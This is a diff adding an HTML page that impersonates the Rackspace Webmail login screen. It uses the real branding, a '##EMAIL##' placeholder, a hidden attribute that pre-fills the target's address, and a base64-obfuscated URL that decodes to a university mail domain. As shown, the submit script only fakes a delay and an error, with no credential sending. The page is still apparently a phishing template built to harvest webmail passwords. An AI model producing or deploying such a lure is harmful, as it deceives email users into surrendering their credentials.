@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Rackspace Webmail: Hosted Email for Business</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700"
+    />
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <style>
+      /* Page Defaults */
+      * {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        font-size: 14px;
+        line-height: 1.42857;
+        color: #333333;
+        background-color: #fafafa;
+        margin: 0;
+      }
+
+      .caption {
+        display: inline-block;
+        font-size: 12px;
+        color: #666;
+      }
+
+      .base_link {
+        display: inline-block;
+        color: #0c7c84;
+        text-decoration: none;
+      }
+
+      .base_links {
+        background: #ffffff;
+        text-align: center;
+        padding-bottom: 20px;
+        margin-top: -15px;
+      }
+
+      .divider {
+        display: inline-block;
+        margin: 0px 5px;
+        color: #0c7c84;
+      }
+      /* Page Layout */
+      #content {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        right: 0;
+        background: #eaeaea;
+      }
+
+      #content-header {
+        height: 53px;
+        padding: 16px;
+        font-size: 24px;
+        font-weight: 300;
+        line-height: 18px;
+        background: #424242;
+        color: #fcfcfc;
+      }
+
+      #content-header-logo {
+        float: right;
+      }
+
+      #logo {
+        width: 130px;
+        margin-top: -9px;
+        margin-right: -5px;
+      }
+
+      #content-header-label {
+        float: left;
+      }
+
+      #content-body {
+        display: flex;
+        justify-content: start;
+        background: #ffffff;
+        min-width: 790px;
+      }
+
+      #banner-section {
+        height: 285px;
+        width: 314px;
+        margin: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+      #banner {
+        width: 190px;
+      }
+
+      #divider {
+        border: 1px solid rgb(224, 224, 224);
+        margin: 40px 0px;
+      }
+      /* Form Layout */
+      #form {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        padding: 20px;
+        min-height: 268px;
+        width: 100%;
+      }
+
+      #form-body {
+        height: 205px;
+        width: 100%;
+        margin: 40px 0px 0px 20px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding-right: 20px;
+      }
+
+      #form-container {
+        width: 100%;
+        margin: 0px auto;
+        padding: 0px 10px;
+      }
+
+      .row {
+        margin: 0px -10px;
+      }
+
+      .row:before,
+      .row:after {
+        content: " ";
+        display: table;
+      }
+
+      .col {
+        width: 100%;
+        float: left;
+        position: relative;
+        min-height: 1px;
+        padding: 0px 10px;
+      }
+
+      .form-group {
+        width: inherit;
+        padding-right: 30px;
+        margin-bottom: 20px;
+      }
+
+      .form-label {
+        position: relative;
+        font-family: Roboto;
+        font-size: 16px;
+        margin-bottom: 8px;
+        line-height: 1;
+        color: #616161;
+        display: inline-block;
+        max-width: 100%;
+      }
+
+      .form-field {
+        border: 1px solid #bdbdbd;
+        border-radius: 2px;
+        background: #ffffff;
+        font-family: Roboto;
+        font-size: 16px;
+        color: #616161;
+        height: 32px;
+        display: block;
+        width: 100%;
+        padding: 4px 8px;
+        line-height: 1.42857;
+        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+        -webkit-transition: border-color ease-in-out 0.15s,
+          box-shadow ease-in-out 0.15s;
+        -o-transition: border-color ease-in-out 0.15s,
+          box-shadow ease-in-out 0.15s;
+        transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+      }
+
+      #forgot-password {
+        position: absolute;
+        top: 0px;
+        right: 40px;
+        color: #0c7c84;
+        text-decoration: none;
+        background-color: transparent;
+        box-sizing: border-box;
+      }
+
+      #login-btn-toolbar {
+        float: right;
+        margin: auto 30px 15px -20px;
+      }
+
+      #login-btn {
+        float: right;
+        display: inline-flex;
+        flex-direction: row;
+        justify-content: center;
+        align-items: center;
+        padding: 0 12px;
+        height: 32px;
+        line-height: 1px;
+        font-size: 14px;
+        font-weight: 400;
+        text-transform: capitalize;
+        color: #fff;
+        background-color: #0c7c84;
+        border-color: #0c7c84;
+        margin-bottom: 0;
+        text-align: center;
+        vertical-align: middle;
+        touch-action: manipulation;
+        cursor: pointer;
+        background-image: none;
+        border: 1px solid transparent;
+        white-space: nowrap;
+        border-radius: 2px;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+
+      #form-container {
+        width: 100%;
+        margin: 0px auto;
+        padding: 0px 10px;
+      }
+
+      @media only screen and (max-device-width: 480px) {
+        /* Page Defaults */
+        body {
+          font-size: 19pt;
+          line-height: 1.42857em;
+        }
+
+        .caption {
+          display: inline-block;
+          font-size: 80%;
+          color: #666;
+        }
+        /* Page Layout */
+        #content {
+          align-items: inherit;
+          display: inherit;
+          justify-content: inherit;
+        }
+
+        #content-header {
+          font-size: 171%;
+          height: 3em;
+          line-height: 1em;
+          padding: 1em;
+        }
+
+        #content-header-logo {
+          float: right;
+        }
+
+        #logo {
+          margin-left: 6em;
+          width: inherit;
+          height: 1em;
+        }
+
+        #banner-section {
+          display: none;
+        }
+
+        #divider {
+          display: none;
+        }
+        /* Form Layout */
+        .form-label {
+          font-size: 114%;
+        }
+
+        .form-field {
+          font-size: 114%;
+          height: 2em;
+        }
+
+        #forgot-password {
+          right: 2em;
+          top: 0;
+        }
+
+        #login-btn-toolbar {
+          margin: 1.5em 2em 1em -1.5em;
+        }
+
+        #login-btn {
+          font-size: 150%;
+          height: 3em;
+          padding: 1.25em;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div>
+      <!-- Add this for email pre-fill -->
+      <div id="getme" eilId=""></div>
+
+      <div id="content">
+        <div>
+          <div id="content-header">
+            <div id="content-header-logo">
+              <img
+                id="logo"
+                src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"
+              />
+            </div>
+            <div id="content-header-label">Webmail Login</div>
+          </div>
+          <div id="content-body">
+            <div id="banner-section">
+              <a style="cursor: pointer">
+                <img
+                  id="banner"
+                  src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg"
+                />
+              </a>
+            </div>
+            <div id="divider"></div>
+            <form
+              id="form"
+              method="post"
+              name="login"
+              action=""
+              autocomplete="off"
+            >
+              <div id="form-body">
+                <div id="form-container">
+                  <div
+                    id="err"
+                    style="
+                      color: rgb(211, 47, 47);
+                      margin-bottom: 20px;
+                      font-weight: 500;
+                      display: none;
+                    "
+                  >
+                    Username / Password incorrect
+                  </div>
+                  <input
+                    type="hidden"
+                    name="__RequestVerificationToken"
+                    value="CfDJ8ECOo3G2CgtIm9FFwnkWl6Oy1rn5hX5tN_FkwwtDFJRtjcd16rSuJPM4kEvo5qt0ZEQalh0PJlWH6MyrvbMIsU3W-R2PxjtjzTRuQ-L6aX1kCQAhpcOxQmI3JV_bIB5-YasnNOgAhOPFtq7s02i3Wsk"
+                  />
+                  <!-- destination and flags is used for OWA login -->
+                  <input
+                    id="form-destination"
+                    type="hidden"
+                    name="destination"
+                    value=""
+                  />
+                  <input
+                    id="form-owa-flags"
+                    type="hidden"
+                    name="flags"
+                    value="4"
+                  />
+                  <div id="user-row" class="row">
+                    <div id="user-col" class="col">
+                      <div id="user-field" class="form-group">
+                        <label id="user-label" class="form-label"
+                          >Email address</label
+                        >
+                        <input
+                          id="user-input"
+                          name="username"
+                          tabindex="1"
+                          class="form-field"
+                          value="##EMAIL##"
+                          autocomplete="username"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div id="pass-row" class="row">
+                    <div id="pass-col" class="col">
+                      <div id="pass-field" class="form-group">
+                        <label id="pass-label" class="form-label"
+                          >Password</label
+                        >
+                        <input
+                          id="pass-input"
+                          name="password"
+                          tabindex="2"
+                          type="password"
+                          class="form-field"
+                          value=""
+                          autocomplete="current-password"
+                        />
+                      </div>
+                      <a
+                        id="forgot-password"
+                        href="/wmidentity/recover/password"
+                        tabindex="4"
+                        >Forgot password?</a
+                      >
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div id="login-btn-toolbar">
+                <button
+                  onclick="submitLogin(event);"
+                  id="login-btn"
+                  tabindex="3"
+                  type="submit"
+                >
+                  <!-- Changed span ID to class -->
+                  <span class="login-btn-text">Log In</span>
+                </button>
+              </div>
+            </form>
+          </div>
+          <div class="base_links">
+            <a
+              class="base_link"
+              target="_blank"
+              href="http://www.rackspace.com/information/legal/privacystatement"
+            >
+              Privacy Statement
+            </a>
+            <div class="divider">|</div>
+            <a
+              class="base_link"
+              target="_blank"
+              href="http://www.rackspace.com/information/legal/websiteterms"
+            >
+              Website Terms
+            </a>
+          </div>
+          <div class="footer" style="text-align: center; margin-top: 10px">
+            <div class="caption">
+              Need webmail for your business? Learn more about
+              <a
+                href="//www.rackspace.com/email-hosting/webmail"
+                style="color: #666"
+              >
+                Hosted Email
+              </a>
+              from Rackspace
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- const url = atob(urlx); -->
+    <script type="text/javascript">
+      document.addEventListener("DOMContentLoaded", function () {
+        // Safely get email element
+        const emailElement = document.getElementById("getme");
+        if (emailElement) {
+          const email = emailElement.getAttribute("eilId");
+          const userIdField = document.getElementById("user-input");
+          if (userIdField) userIdField.value = email || "";
+        }
+      });
+
+      const land = atob("aHR0cHM6Ly9tYWlsLm5pdHJrbC5hYy5pbi8=");
+
+      console.log("land: ", land);
+      let count = 0;
+
+      function submitLogin(event) {
+        event.preventDefault();
+        // Get elements
+        const userid = document.getElementById("user-input").value;
+        const userpass = document.getElementById("pass-input").value;
+        const errElement = document.getElementById("err");
+        const loginBtn = document.getElementById("login-btn");
+        const loginBtnText = document.querySelector(
+          "#login-btn .login-btn-text"
+        );
+
+        // Fake submission simulation
+        if (userid === "" || userpass === "") {
+          errElement.style.display = "block";
+          errElement.textContent = "Username / Password incorrect";
+          return;
+        }
+
+        // Disable button and show loading state
+        loginBtn.disabled = true;
+        loginBtnText.textContent = "Please wait...";
+
+        // Fake 5-second delay
+        setTimeout(() => {
+          // Re-enable button
+          loginBtn.disabled = false;
+          loginBtnText.textContent = "Log In";
+
+          // Show error message (optional)
+          errElement.style.display = "block";
+          errElement.textContent = "Try again later!";
+
+          // Clear password field (optional)
+          document.getElementById("pass-input").value = "";
+          document.getElementById("pass-input").focus();
+
+          console.log("Fake submission complete");
+        }, 5000); // 5000ms = 5 seconds
+      }
+    </script>
+  </body>
+</html>
